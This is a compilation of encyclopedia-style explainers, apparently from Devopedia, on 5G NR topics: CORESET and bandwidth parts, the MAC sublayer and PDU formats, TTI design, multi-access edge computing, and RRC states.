CORESET spans up to three OFDM symbols .
CORESET at the start of the slot facilitates scheduling decisions .
CORESET in other places may be useful to reduce latency .
In the frequency domain , CORESET is in multiple of six RBs .
A BWP can have up to three CORESETs .
CORESETs are common or UE - specific .
Configured via MIB , CORESET#0 is used for SIB1 scheduling .
After RRC connection , UE - specific CORESETs may be configured .
3GPP completes the standardization of LTE Advanced Pro ( Release 13 ) .
While previous LTE releases required a UE to support full carrier bandwidth , Release 13 introduces eMTC ( enhanced Machine Type Communication ) .
This defines LTE Cat - M1 UE that can operate at a bandwidth of 1.08MHz ( 6 PRBs ) within a normal LTE deployment or 1.4MHz in a standalone deployment .
Thus , LTE recognizes the need that some UE devices may have lower bandwidth requirement or capability and therefore need not receive the full carrier bandwidth .
3GPP publishes Release 15 " early drop " .
In this release , the term Carrier Bandwidth Part is used .
3GPP publishes Release 15 " main drop " .
In this release , the term Bandwidth Part ( BWP ) is used .
This change in name occurred in March 2018 .
In principle , if the UE is able to support it , multiple bandwidth parts with different numerology can be active at the same time .
But in Release 15 , only one BWP ( in each direction ) can be active at a time .
3GPP publishes Release 16 specifications .
There 's no change to the BWP .
A UE can have only one active BWP in each direction .
Architecture of 5 G NR MAC sublayer in the UE .
Source : ETSI 2021a , fig .
4.2.2 - 1 .
The MAC sublayer of the 5 G NR protocol stack interfaces the RLC sublayer from above and the PHY layer from below .
It maps information between logical and transport channels .
Logical channels are about the type of information carried whereas transport channels are about how such information is carried .
Data on a transport channel is packaged into Transport Blocks ( TBs ) whose configuration is determined by Transport Formats ( TFs ) .
A transport block has a dynamic size .
Except in some scenarios , only one transport block is transmitted by MAC in an interval called Transmission Time Interval ( TTI ) .
MAC is configured by RRC layer .
In the simplest case , a UE has a single MAC entity .
However , there are some scenarios when a UE has multiple MAC entities .
The MAC sublayer is specified from a UE perspective in TS 38.321 .
What logical transport channels are relevant to 5 G NR MAC ?
Transport and logical channels relevant to 5 G NR MAC .
Source : ETSI 2021a , sec .
4.5 .
Transport channels are the Service Access Points ( SAPs ) between MAC and PHY .
Likewise , logical channels are the SAPs between RLC and MAC .
In other words , the MAC sublayer provides data transfer services on logical channels based on type of information carried , and uses transport channels to interface to PHY .
MAC handles the following channels , mentioned here as " transport channels ( logical channels ) " : Uplink : RACH ( - ) , UL - SCH ( CCCH , DCCH , DTCH ) Downlink : BCH ( BCCH ) , PCH ( PCCH ) , DL - SCH ( BCCH , CCCH , DCCH , DTCH ) Sidelink : SL - BCH ( SBCCH ) , SL - SCH ( SCCH , STCH ) RACH has no mapping to a logical channel since its information originates / terminates at MAC .
In fact , RACH does n't carry any transport blocks .
BCCH is a logical channel that maps to either BCH or DL - SCH .
Traffic channels include DTCH and STCH , all others being control channels .
Which are the main functions of the 5 G NR MAC ?
RLC need not worry about when and how data is transmitted on the air interface .
Data transfer and radio resource allocation is the job of the MAC .
In the transmit direction , the MAC sublayer maps logical channels coming from the RLC sublayer to transport channels going to the PHY layer .
Multiple logical channels can be multiplexed within a transport block .
In the receive direction , MAC does demultiplexing .
Other than multiplexing / demultiplexing MAC SDUs , MAC also has in - band signalling .
These are called MAC Control Elements ( CEs ) .
In fact , MAC CEs and MAC SDUs can be multiplexed into a single MAC PDU .
In the downlink , a UE is informed by PDCCH about an imminent scheduled transmission on DL - SCH .
In the uplink , UE MAC must first make a Scheduling Request ( SR ) on PUCCH .
UE typically gets a grant on PDCCH or Random Access Response .
Semi - persistent grant via RRC signalling is also possible .
MAC also does scheduling information reporting , error correction through HARQ , logical channel prioritisation , dynamic scheduling across UEs ( DL only ) , and priority handling between overlapping resources of one UE .
Which are the main procedures of 5 G NR MAC ?
When a UE is making its initial access to the network , the Random Access procedure is essential .
This procedure is also invoked in many other scenarios .
It 's 4-step or 2-step .
Each type can be Contention - Based Random Access ( CBRA ) or Contention - Free Random Access ( CFRA ) .
The Random access procedure establishes timing in advance , so that uplink transmission is properly time - aligned when it reaches gNB .
Maintenance of this uplink time alignment is another procedure .
Data transfer in downlink and uplink channels involves DL assignments , UL scheduling requests and UL grants .
Data transfer involves multiplexing / demultiplexing of data , prioritization , and retransmission and error correction due to HARQ .
Similar procedures exist for sidelink channels .
MAC CEs enable signalling .
Examples include activation / deactivation of SCells , activation / deactivation of PDCP duplication , recommending bit rates to the UE , and many more .
UE also reports buffer status and power headroom to help gNB make resources decisions .
Discontinuous Reception ( DRX ) , Bandwidth Part ( BWP ) switching , reset / reconfiguration , beam failure detection and recovery , handling measurement gaps , data inactivity monitoring are some more MAC procedures .
When can a 5 G UE have multiple MAC entities ?
An Example of multiple entities in the 5 G UE MAC sublayer .
Source : ETSI 2021a , fig .
4.2.2 - 2 .
If a 5 G UE is connected to the Master Cell Group ( MCG ) and the Secondary Cell Group ( SCG ) , then there 's a MAC entity for each cell group .
Each entity operates independently , that is , their serving cell , timers , parameters , radio bearers , logical channels and HARQ entities are all independent .
Dual Connectivity ( DC ) is a feature in which a UE can be connected to both MCG and SCG .
For example , MCG could be a 4G / LTE cell and SCG could be a 5 G NR cell .
Another scenario is Dual Active Protocol Stack ( DAPS ) handover in which there 's one MAC entity for the source cell and one for the target cell .
A single MAC entity can support multiple numerologies , transmission timings and cells .
However , RRC can restrict the mapping of a logical channel to a subset of cells , numerologies or other configurations .
This is one way to reduce latency to serving URLLC services .
What 's the role of 5 G NR MAC in Carrier Aggregation ?
Carrier aggregation happens at the MAC sublayer .
Source : Dahlman et al .
2018 , fig .
6.13 .
MAC plays an important role in Carrier Aggregation ( CA ) .
It distributes MAC PDUs and CEs across different Component Carriers ( CCs ) and generates one TB per TTI per CC .
Moreover , each CC has its own HARQ entity within MAC .
Though CA involves multiple carriers or cells , they all come under the same cell group .
A single MAC entity serves all cells involved in CA within the cell group .
Aggregation happens over one Primary Cell ( PCell ) and one or more Secondary Cells ( SCells ) .
Within a single MAC entity there can be multiple instances of transport channels : one DL - SCH , UL - SCH and RACH for Special Cell ( SpCell ) ; one DL - SCH per SCell ; and optionally , one UL - SCH and RACH per SCell .
SpCell is the PCell of either MCG or SCG .
This implies that CA can be combined with DC .
In 5 G NR , what do you mean by High - MAC and Low - MAC ?
Intra - MAC split ( option 5 ) splits MAC between DU and CU .
Source : Larsen et al .
2019 , fig .
2 .
In practical deployments , a 5 G base station or gNB is not a monolith located at the cell site .
It 's often disaggregated into Radio Unit ( RU ) , Distributed Unit ( DU ) and Centralized Unit ( CU ) .
5 G allows multiple ways in which gNB functions can be split across RU , DU and CU .
One way is to split the MAC sublayer into two parts : High - MAC and Low - MAC .
Such a split is called Intra - MAC Split ( Option 5 ) .
With this split , High - MAC , RLC , PDCP and RRC will be in the CU .
Low - MAC will be in the DU .
The DU - CU interface is commonly called midhaul .
Multiplexing / demultiplexing is done on High - MAC .
High - level scheduling decisions are part of High - MAC .
Inter - cell interference coordination as needed in CoMP can be done in High - MAC in a more centralized manner .
Time - critical processing such as HARQ , random access control , scheduling - related information processing and reporting are in Low - MAC .
3GPP publishes version 0.0.1 of MAC specification TS 38.321 .
By September , this evolved to version 1.0.0 .
3GPP publishes Release 15 " early drop " .
MAC specification TS 38.321 is upgraded to version 15.0.0 .
3GPP publishes Release 15 " main drop " .
MAC changes part of this release include beam failure recovery timer , prioritized random access , and PDCP duplication .
In version 15.4.0 of MAC specification , a data inactivity timer is introduced .
3GPP publishes Release 16 specifications .
Main MAC enhancements or additions in this release include Integrated Access and Backhaul ( IAB ) , dormant BWP operation , eMIMO , 2-step RACH procedure , New Radio Unlicensed ( NR - U ) , eURLLC , Industrial IoT , UE power saving , V2X with NR Sidelink , NR positioning , and a new MAC subheader for MAC CEs .
An RLC PDU maps to a MAC SDU .
Source : ETSI 2021b , fig .
6.6 - 1 .
An RLC PDU ( Protocol Data Unit ) consists of an RLC header and an RLC payload .
On MAC sublayer , such an RLC PDU is called MAC SDU ( Service Data Unit ) .
MAC adds a subheader to this to construct a MAC subPDU .
MAC also sends / receives Control Elements ( CEs ) , each with its own subheader .
Signalling via MAC CEs complements RRC signalling by enabling dynamic configuration changes .
Multiple MAC SDUs and CEs can be part of a single MAC PDU .
A MAC PDU is packaged as a Transport Block ( TB ) and sent on a transport channel to the PHY layer for transmission .
While 5 G NR MAC has a general structure for its PDUs , there are differences across downlink , uplink and sidelink channels .
The Random access procedure has a specialized MAC PDU structure .
How does a 5 G NR MAC PDU differ from a LTE MAC PDU ?
Comparing MAC PDU of LTE versus 5 G NR .
Source : Devopedia 2021 .
A MAC PDU in LTE has a single header that has all the necessary information for decoding the entire PDU .
In 5 G , the MAC PDU has one or more subheaders , each subheader providing information to decode its corresponding MAC subPDU .
This redesign reduces latency in 5 G NR .
In LTE UE , a MAC PDU ca n't be assembled until an uplink grant is available , since this determines the TB size .
In 5 G , MAC subPDUs can be assembled in advance .
As soon as the grant is available , MAC simply adds the necessary padding and concatenates subPDUs .
The NR design also allows MAC to process its PDU from the back .
There 's a particular RLC detail that improves latency in 5 G NR .
In LTE , RLC is the concatenation of RLC SDUs into a single RLC PDU .
Hence , LTE UE ca n't construct its RLC PDU until an uplink grant is received .
5 G NR RLC does n't concentrate .
An RLC data PDU contains only one RLC SDU .
Multiplexing / demultiplexing of RLC PDUs ( regardless of the radio bearer ) happens on MAC .
What are some essential facts about MAC PDUs ?
Structure of DL and UL MAC PDUs .
Source : Adapted from ETSI 2021a , sec .
6.1.2 .
A MAC PDU consists of one or more MAC subPDUs .
A MAC subPDU always starts with a subheader .
The subheader is followed by a MAC SDU , a MAC CE or padding .
When a set of MAC subPDUs does n't exactly fill a TB , a MAC subPDU with padding is included .
A MAC subPDU with only a subheader implies zero - length padding .
Only one MAC PDU is allowed in a TB .
MAC SDUs , CEs and subheaders are all byte aligned and in multiples of 8 bits .
The leftmost bit is the most significant bit .
The order of subPDUs in a MAC PDU is defined .
In sidelink and uplink , the order of concatenation is MAC SDUs , CEs and padding .
In the downlink , the order is MAC CEs , SDUs and padding .
In all cases , padding is the last subPDU .
MAC SDUs are of variable size , except for an SDU carrying UL CCCH .
Some MAC CEs are of fixed size while others are of variable size .
In transparent MAC ( BCH , PCH , BCCH on DL - SCH , SL - BCH ) , there 's no MAC subheader .
One MAC SDU is aligned to the TB size .
Which are the main fields of a 5 G NR MAC subheader ?
Structure of 5 G NR MAC subheader .
Source : Devopedia 2021 .
The MAC subheader consists of the following fields : Reserved : R bit is set to 0 .
It may be used in future updates to MAC .
Format : F bit indicates the size of the length field L. For F=0 , L is 8 bits , else L is 16 bits .
Length : L field indicates the length in bytes of either a MAC SDU or a variable - sized CE .
This field is absent when not necessary , such as fixed - size CE , padding or MAC SDU containing UL CCCH .
The UL CCCH MAC SDU is of fixed size : 64 bits if LCID=0 , 48 bits if LCID=52 .
Logical Channel ID ( LCID ) : This 6-bit field identifies the logical channel carried in a MAC subPDU , a specific CE or padding .
Extended Logical Channel ID ( eLCID ) : This extends the range of the LCID field .
Its size is 1 byte if LCID=34 , 2 bytes if LCID=33 .
Two - byte eLCID is used only on IAB backhaul links .
Could you describe the LCID field carried in a 5 G NR MAC PDU ?
LCID values and meaning differ for downlink , uplink and sidelink .
We will note briefly some of these values .
In DL - SCH , LCID=0 indicates CCCH .
In UL - SCH , LCID values of 0 or 52 indicate CCCH .
In both DL and UL , values 1 - 32 indicate identity of the logical channel since MAC does the multiplexing / demultiplexing of RLC PDUs coming via logical channels .
Many other values indicate that a MAC subPDU contains MAC CE .
LCID=63 is for padding .
Values 33 or 34 imply that the eLCID field is present in the subheader .
Some DL CEs pertain to DRX , Timing Advance , recommended bit rate , UE Contention Resolution Identity , and activation / deactivation of various protocol features .
Some UL CEs pertain to Buffer Status Report ( BSR ) , Power Headroom Report ( PHR ) , Listen Before Talk ( LBT ) , C - RNTI and recommended bit rate query .
What 's the structure of a 5 G NR MAC PDU for random access procedure ?
Structure of MAC PDU pertaining to random access procedure .
Source : Adapted from ETSI 2021a , sec .
6.1.5 .
MAC PDUs have one or more MAC subPDUs and optional padding .
There are two types of PDUs : Random Access Response ( RAR ) : Each MAC subPDU has a subheader followed by Backoff Indicator ( BI ) , Random Access Preamble Identifier ( RAPID ) , and RAPID plus RAR .
If present , a BI subPDU comes at the start of a MAC PDU and padding comes at the end .
Padding is not part of a subPDU .
The MAC subheader is different for BI and RAPID .
MsgB : This is applicable in a 2-step procedure .
Each MAC subPDU has its own subheader plus BI , fallbackRAR , successRAR , MAC SDU for CCCH or DCCH , or padding .
If the PDU contains MAC SDUs , padding is encapsulated within the last subPDU .
Among the subheader fields are extension E , type T / T1 / T2 , reserved bits R , S field , BI , and RAPID .
The contents of fallbackRAR and successRAR are defined in the standard .
MAC RAR includes Timing Advance Command , UL Grant and Temporary C - RNTI .
During random access procedure , MAC CEs are used to transfer C - RNTI and UE Contention Resolution Identity .
What 's the structure of a 5 G NR MAC PDU for the Sidelink Shared Channel ?
Structure of SL - SCH MAC PDU .
Source : ETSI 2021a , fig .
6.1.6 - 2 .
SL - SCH MAC PDUs are not very different from DL - SCH or UL - SCH MAC PDUs .
They , too , contain one or more MAC subPDUs , each subPDU containing a subheader .
The order of concatenation is the same as in uplink : MAC SDUs , MAC CEs and padding .
The main addition is the SL - SCH subheader .
It 's of fixed size ( 4 bytes ) containing the following : Version Number : V field is of 4 bits .
In Release 15 and 16 , this is set to 0 .
Reserved : There are 4 R bits set to 0 in the SL - SCH subheader .
Source : SRC field is 16 bits long and contains the 16 most significant bits of Source Layer-2 ID given by the upper layers .
Destination : DST field is 8 bits long and contains the 8 most significant bits of Destination Layer-2 ID given by the upper layers .
The SL - SCH subheader does n't itself have an LCID field but the subheader of each MAC subPDU contains an LCID field .
Values 4 - 19 indicate the identity of the logical channel .
LCID=62 is for Sidelink CSI Reporting .
LCID=63 is for padding .
eLCID field is not applicable for sidelink .
3GPP publishes Release 15 " early drop " .
MAC specification TS 38.321 is upgraded to version 15.0.0 .
MAC specification version 15.1.0 is published .
A change request titled Introduction of MAC CEs for NR MIMO adds many MAC Control Elements to this release .
3GPP publishes Release 16 specifications .
Changes include MsgB MAC PDU format and Absolute Timing Advance Command MAC CE for the 2-step RACH procedure .
Different numerologies in 5 G NR affect slot duration and TTI .
Source : Qualcomm 2018 , slide 13 .
Transmission Time Interval ( TTI ) is composed of consecutive OFDM symbols in the time domain in a particular transmit direction .
By combining different numbers of symbols , different TTI durations are possible .
In the frequency domain , different numerologies are permitted , corresponding to different Sub - Carrier Spacing ( SCS ) .
A higher SCS shortens symbol duration and hence shortens TTI .
A combination of numerology and TTI determines how many bits and in what manner they 're transmitted on the air interface .
Compared to LTE , 5 G NR improves the design of TTI towards lower latency and more efficient use of radio resources .
For 5 G 's Ultra - Reliable and Low - Latency Communications ( URLLC ) uses cases covering driverless cars , disaster response , factory automation and more , low latency is essential .
It 's been noted that latency is , in general , a function of the TTI .
How does TTI design for 5 G compare against 4G / LTE ?
In 4G / LTE , TTI is fixed to 1ms and it 's composed of 14 OFDM symbols .
This is only the transmission time on the air interface .
Other delay components include processing delay ( at base station and UE ) and HARQ retransmissions .
In uplink , making a scheduling request and waiting for the grant adds to the delay .
Estimates of one - way delay assuming a 10 % block error rate are 4.8ms ( DL ) and 11.3ms ( UL ) .
This is a significant delay for the URLLC case .
LTE Release 15 introduced shortened TTI of 2 symbols and 7 symbols .
In FDD - LTE , both are allowed .
In TDD - LTE , only 7-symbol shortened TTI is allowed .
The release also specifies how processing times can be shortened .
Making these changes to LTE was a challenge due to requirements of backward compatibility , that is , UEs that do n't support shortened TTI should coexist with those that do .
The 5 G design includes scalable TTI , corresponding to slot durations of 62.5µs to 1ms .
One or more consecutive slots allocated to either DL or UL make up a TTI .
5 G also incorporates mini - slot transmissions , which is similar to what LTE calls shortened TTI .
Could you describe 5 G NR 's scalable TTI design ?
5 G NR allows for scalable TTI .
Source : Qualcomm 2016 , fig .
15 .
By using different SCS in 5 G NR , different slot durations and TTIs are configurable .
For example , 15kHz SCS with 14 symbols spanning the entire subframe corresponds to LTE 's configuration .
At 240kHz SCS ( for control only ) , 14 symbols are squeezed into a 62.5µs slot .
In Release 16 , 120kHz is the maximum SCS allowed for data .
Hence , the lowest achievable slot duration is 125µs .
At 60kHz , there 's an option to use extended cyclic prefix ( CP ) , thus limiting the slot duration to 12 symbols .
Unfortunately , as SCS increases , CP decreases .
This means that in deployments where there 's a long delay spread , CP will not offer sufficient protection against inter - symbol interference ( ISI ) .
Thus , reducing TTI by increasing SCS is not always possible .
For this reason , 5 G NR also allows for mini - slot transmissions .
With mini - slots , a TTI can be as small as 2 , 4 or 7 symbols .
For example , at 30kHz SCS , the corresponding durations are about 70µs , 140µs and 250µs .
Thus , we can cater to URLLC case even at a lower SCS .
Could you explain pipeline processing in relation to 5 G NR TTI and TB ?
Reducing processing time via pipeline processing .
Source : Takeda et al .
2017 , fig .
5 .
The MAC sublayer sends a transport block ( TB ) to PHY for transmission every TTI .
On the receiving side , the MAC layer ca n't process the TB until it 's fully received .
In extreme cases , TB can have more than a million bits .
A method to reduce the processing delay is to break up the TB into code blocks .
Each code block independently goes through channel coding and rate matching .
This feature , which also exists in LTE , is called code block segmentation .
To distribute the processing across time , code blocks are mapped to different OFDM symbols .
Processing can be decoupled from TTI duration .
Processing can start as soon as a code block is received and happens in parallel with the next code block reception .
This is called pipeline processing .
Ultimately , this reduces the processing time at the receiver .
Pipeline processing is possible because time - domain interleaving is not done .
Mapping of bits to resource blocks is also done in a frequency - first manner .
What 's TTI bundling in 5 G NR ?
Slot aggregation or TTI bundling in 5 G NR .
Source : Swamy 2019 .
TTI bundling is when the same TB is transmitted across multiple TTIs .
This is done for the sake of redundancy and higher chance of successful transmission .
For some time - critical services such as voice , delayed HARQ retransmissions are not useful .
By pre - emptively transmitting multiple copies of the same data , quality is improved .
TTI bundling reduces retransmissions and round trip time .
It may be useful towards UEs that are the cell edge .
TTI bundling exists in LTE and is not new to 5 G NR .
The 5 G NR standard does n't often use the term TTI bundling .
Instead , slot aggregation is a more common term .
The feature is enabled via RRC signalling .
RRC Information Elements ( IEs ) ` pdsch - AggregationFactor ` and ` pusch - AggregationFactor ` signal the number of repetitions , which can be 2 , 4 or 8 .
Besides TTI , what are other techniques in 5 G NR design that reduce latency ?
Latency components in DL transmission and ways to control them .
Source : 5 G Americas , fig .
4.1.[(5 G Americas , fig .
4.1 ) ] Besides shorter TTI via numerology and use of mini - slot TTI , other ways to reduce latency include frequency transmission opportunities to minimize wait time , shorter processing time via pipeline processing , grant - free UL transmission and flexible TDD frame structure .
DMRS is front loaded , that is , it comes at the start of the frame .
A UE can therefore start channel estimation and decoding at the earliest .
To enable quick HARQ feedback , 5 G NR uses a self - contained subframe structure .
A subframe contains DL control , DL data , guard period and UL control .
Thus , ACK / NACK for DL data can be sent in the same subframe .
A similar self - contained uplink - centric subframe exists .
Multiple code blocks are grouped into a Code Block Group ( CBG ) .
If there 's an error , only that CBG is retransmitted , not the entire TB .
With fewer bits , errors at CBG are less likely than at TB .
Moreover , slot aggregation tries to minimize retransmissions .
For channel coding , 5 G NR uses Low - Density Parity Check ( LDPC ) .
The LDPC has a highly parallelizable decoder , thus reducing processing time .
Durisi et al .
note that some use cases , such as Machine - to - Machine ( M2 M ) communications , send short packets .
Likewise , there are use cases that require low latency .
Given these requirements , they propose performance metrics and protocols more suited for short packets .
Shortened TTI and shorter processing in LTE Release 15 .
Source : Qualcomm , via Mavrakis 2018 .
A proposal by Ericsson identifies shortened TTI and processing time for LTE .
From its beginning in Release 8 to the most recent Release 13 , LTE has focused on increasing data rates and no enhancements have come to lower latency .
Lower latency will improve TCP throughput and reduce L2 buffer space requirements .
Eventually , this proposal is standardized in LTE Release 15 .
Qualcomm filed a patent titled TTI Bundling for URLLC UL / DL Transmissions .
For selected UEs that may benefit from this feature , the base station signals the bundle length .
Subsequently , data or control packets are repeated to those UEs .
The number of repetitions corresponds to signalled bundle length .
As part of Release 17 work , modifications to TTI bundling are proposed to improve PUSCH coverage .
One proposal is to allow repetition across non - consecutive slots .
Another is to consider symbol - level repetition .
MEC brings apps and services closer to the edge .
Source : GIGABYTE 2021 .
In traditional cloud computing , apps and services are hosted in data centres .
Devices connect to the data centres via multiple hops traversing the internet .
If devices are smartphones , they probably connect via the RAN and the CN of the mobile network operator .
Multi - Access Edge Computing ( MEC ) brings apps and services closer to the network edge .
MEC also exposes real - time radio network and context information .
The benefit is better user experience , network performance , and resource utilization .
MEC is just one among many edge computing paradigms , the others being cloudlets , fog computing and Mobile Cloud Computing ( MCC ) .
MEC is perhaps more popular since it 's standardized .
ETSI is the main organization standardizing MEC .
One possible definition is that MEC offers application developers and content providers cloud - computing capabilities and an IT service environment at the edge of the network .
What are the benefits of MEC for users , service providers and network operators ?
Key benefits of MEC .
Source : Juniper Networks 2021 .
MEC enables many use cases that require high bandwidth , ultra - low latency and high device density .
Users get a richer experience .
Safety has improved for critical applications such as industrial automation and self - driving vehicles .
If 5 G promises many novel use cases , it 's MEC that delivers them .
MEC helps network operators reduce their CAPEX by purchasing general - purpose equipment rather than specialized telecom equipment .
By reducing bandwidth requirements between RAN and CN , OPEX is also reduced .
Due to virtualization , reliability and scalability have improved .
Heterogenous configurations can be supported .
Network entities can be rapidly deployed , leading to just - in - time service initiation .
Network performance can be optimized by adapting to changing radio conditions .
Operators can offer innovative applications and unlock new revenue streams by safely opening up their networks to third - parties .
Traditionally , it made sense only for big service providers such as Netflix to deploy edge servers for their traffic .
With MEC , even smaller service providers and independent software vendors can get their applications to the edge on multi - vendor platforms .
This is mainly because MEC is standardized with open interfaces and protocols .
What are some use cases that can benefit from MEC ?
Two examples use cases of MEC .
Source : Adapted from Hu et al .
2015 , figs .
3 , 4 .
MEC brings proximity , ultra - low latency , high bandwidth and virtualization .
These characteristics can benefit many use cases : data / video analytics , location tracking services , augmented reality , IoT , local hosting of video content , data caching , remote surgery , patient management , radio - aware video optimization , autonomous vehicles , and more .
As more and more applications become virtualized , MEC will become increasingly important .
Applications can be dynamically deployed , scaled and moved between the cloud and the edge .
On college campuses , business parks , hospitals or factories , private / local networks can be deployed .
For mission critical communications , MEC can continue delivering services even when backhaul communications fail .
IoT applications require ultra - low latency , mobility management , geo - distribution , location awareness and scalability .
MEC is able to provide these for diverse IoT applications such as smart home , smart city , smart agriculture , smart energy , healthcare , wearables and industrial internet .
Which are the main enablers for MEC ?
MEC is made possible by the following technologies : Network Functions Virtualization ( NFV ) : NFV is about deploying network functions in virtual environments rather than with dedicated hardware .
MEC reuses the NFV Infrastructure ( NFVI ) and NFV Management and Orchestration ( MANO ) .
In other words , MEC platforms and applications appear as VNFs and run on the same infrastructure as RAN or CN VNF components .
Software - Defined Networking ( SDN ) : Involves separating the control plane and user plane , logically centralizing the control plane and programming the control plane in a more flexible manner using APIs .
An SDN controller can be on the MEC server .
SDN brings scalability , availability , resilience , interoperability and extensibility to MEC operation .
Service Function Chaining ( SFC ) : Built from NFV , operators can use SFC to interconnect multiple NFs ( virtual or physical ) in a specific order to achieve end - to - end services and steer traffic flows .
Network Slicing : A network slice is a logical network set up for specific performance requirements .
Using SDN / NFV , slices can be dynamically instantiated , modified or terminated .
Information - Centric Networking ( ICN ) : Replaces the client - server model of the internet with a publish - subscribe model involving caching , replication and optimal content distribution .
Could you describe ETSI 's MEC reference architecture ?
ETSI 's MEC reference architecture .
Source : ETSI 2020a , fig .
6 - 1 .
ETSI 's MEC reference architecture has the following main entities : MEC Host : Contains MEC platform .
Virtualized infrastructure provides computer , storage , and network resources for running MEC applications .
Routes traffic among applications , services and access local / external networks .
Executes traffic rules received by the MEC platform .
MEC Application : Runs on a Virtual Machine ( VM ) or container on the MEC host .
Configured and validated by MEC management .
MEC Platform : Has essential functionality needed to run MEC applications .
It enables applications to discover , advertise , offer or consume MEC services .
Platforms can also provide services .
Receives traffic rules from MEC platform manager .
may be interfaced with an API gateway for apps to access MEC service APIs .
MEC Management : Comprises of system - level and host - level management .
The former oversees the complete MEC system and includes Multi - Access Edge Orchestrator ( MEO ) as a core component .
The latter manages a particular host and its applications and includes MEC Platform Manager ( MEPM ) and Virtualisation Infrastructure Manager ( VIM ) .
The reference architecture contains three groups of reference points among entities : Mp for platform functionality , Mm for management , and Mx for external entities .
What are the different MEC deployment models ?
Different ways to deploy MEC in cellular networks .
Source : Owen 2020 .
MEC servers can be deployed at base station sites , aggregation points in the radio network , mobile EPC sites or regional data centres .
A distributed data centre or a gateway at the edge of the CN could be MEC deployment sites .
There 's a trade - off : the closer to the edge , the greater the benefits , but so is the cost of deploying at many locations .
It 's therefore expected that most operators will initially deploy at a few EPC sites and central offices .
As more applications emerge demanding 1ms latency , operators will start deploying closer to the edge .
To reduce CAPEX , operators may even share MEC infrastructure .
An MEC server can be indoors at a multi - RAT cell aggregation site serving an enterprise ; or it could be outdoors for public coverage scenarios such as stadiums and shopping malls .
Ultimately , deployment depends on scalability , physical constraints , performance criteria , cost of deployment , etc .
Some MEC services may be unavailable in some deployment scenarios .
Vendors offer equipment optimized for specific deployment locations .
For example , GIGABYTE 's H242-Z10 is for base station tower whereas G242-Z10 is for aggregated sites .
Could you mention some resources to learn more about MEC ?
MEC specifications from ETSI are available for download via a search feature .
Apart from the specifications , via the DECODE Working Group , ETSI provides API implementations , testing , a proof - of - concept framework and a sandbox environment .
This makes it easier for vendors , operators and application developers to implement MEC .
A beginner can start with ETSI 's white papers on MEC .
There 's also an MEC blog for the latest updates .
The main MEC wiki page is an entry point for MEC ecosystem , testing , sandbox , proof - of - concept updates , deployment trials and hackathons .
The MEC Ecosystem page lists MEC applications and solutions .
Among the many open source projects related to edge computing , two important ones are Akraino and EdgeX Foundry .
These come under LF Edge , an umbrella organization under the Linux Foundation .
A useful resource is LF Edge 's own Wiki page .
ETSI forms the Mobile Edge Computing Industry Specification Group ( ISG ) .
The first meeting of MEC ISG takes place and is attended by 24 organizations , including network operators , vendors , technology suppliers and Content Delivery Network ( CDN ) providers .
ETSI 's MEC ISG publishes two specification documents : Proof of Concept Framework and Service Scenarios .
The group develops three PoC scenarios .
These relate to video optimization and orchestration by adapting to RAN or radio conditions .
At the MEC World Congress , at the ETSI MEC PoC Zone , six multi - vendor proofs of concept were demonstrated based on the MEC PoC framework .
It 's hoped that such PoCs lead to a diverse and open MEC ecosystem .
ETSI renamed MEC from Mobile Edge Computing to Multi - Access Edge Computing .
The new name reflects its relevance to mobile , Wi - Fi , and fixed access networks .
ETSI 's MEC group works on Phase 2 activities to address charging , regulatory compliance , mobility support , containerization , support of non-3GPP mobile networks , automotive vertical , and more .
This year saw approval of 12 MEC PoCs and 2 MEC Deployment Trials ( MDTs ) .
A new working group named DECODE has also been created to focus on deployment and ecosystem development .
Akraino Release 1 was released with ten " ready and proven " blueprints .
Blueprints are tested by Akraino community members on real hardware .
They serve as an easy starting point for real - world edge implementations and edge use cases .
Akraino comes under LF Edge , an umbrella organization founded in January 2019 to bring together multiple edge - specific projects .
In Release 3 ( Aug 2020 ) , MicroMEC is specified .
By Release 4 ( Feb 2021 ) , Akraino has 27 blueprints .
5 G UE RRC states concerning NR/5GC , E - UTRA / EPC and E - UTRA/5GC .
Source : Adapted from ETSI 2021a , fig .
4.2.1 - 2 .
Radio Resource Control ( RRC ) is a layer within the 5 G NR protocol stack .
It exists only in the control plane , in the UE and in the gNB .
The behaviour and functions of the RRC are governed by the current state of the RRC .
In 5 G NR , RRC has three distinct states : RRC_IDLE , RRC_CONNECTED and RRC_INACTIVE .
For each UE RRC state , applicable functions are clearly defined in the standard .
Moreover , it 's also defined how state transitions will happen , not only within 5 G but also to 2G/3G/4 G systems via handover or PLMN / cell reselection .
RRC_INACTIVE is not applicable for Non - Standalone ( NSA ) mode of operation .
Why was the RRC_INACTIVE state introduced in 5 G ?
RRC_INACTIVE state minimizes signalling and therefore power consumption and latency .
Source : da Silva et al .
2019 .
Before 5 G , RRC had only two states , idle and connected .
In a connected state , radio resources are allocated to the UE and typically active communication ( user plane or control plane ) takes place between the UE and the network .
Otherwise , UE is in an idle state .
While releasing an RRC connection is good for capacity utilization and power saving , it 's not ideal from a latency perspective .
For Machine Type Communications ( MTC ) and IoT applications , it 's typical for devices to send small amounts of data .
The overhead in establishing an RRC connection to do this is bad from a power perspective .
The extra signalling also introduces delays that are not ideal for URLLC cases .
Since 5 G caters to new cases such as mMTC and URLLC , RRC_INACTIVE has been introduced .
While entering this state , both UE and NG - RAN save radio and security configurations .
This saved UE Inactive Access Stratum ( AS ) context can be quickly restored with minimal signalling when moving to a connected state .
Essentially , RRC_INACTIVE is UE RRC 's way of implementing an " always on " radio connection with the network .
What are the functions in each of the 5 G UE RRC states ?
Important 5 G UE RRC functions mapped to RRC states .
Source : Intel 2018 , slide 49 .
In RRC_INACTIVE and RRC_CONNECTED , UE and NG - RAN store AS inactive context and AS context respectively .
In RRC_IDLE , UE may be registered with the Core Network ( CN ) but no AS context is stored .
In both RRC_IDLE and RRC_INACTIVE , UE does measurements of neighbouring cells and can do reselection .
In RRC_CONNECTED , UE mobility is controlled by the CN and handovers can be initiated .
Data transfer , CA , DC and measurement reporting are supported .
In RRC_IDLE , UE paging is initiated by the CN .
In RRC_INACTIVE , UE paging is initiated by NG - RAN .
To page a UE , its location must be known .
In RRC_IDLE , this is the Tracking Area ( RA ) .
In RRC_INACTIVE , this is the RAN - based Notification Area ( RNA ) and UE may initiate RNA updates .
In RRC_IDLE , Discontinuous Reception ( DRX ) is configured with higher layers .
In RRC_INACTIVE , configuration comes from higher layers and RRC .
In RRC_CONNECTED , DRX configuration is for discontinuously monitoring DL PDCCH .
How does UE RRC transition from one state to another in 5 G NR ?
RRC_IDLE to RRC_CONNECTED happens via the RRC Connection Setup procedure .
This consists of three messages : RRCSetupRequest ( UE initiated ) , RRCSetup , and RRCSetupComplete .
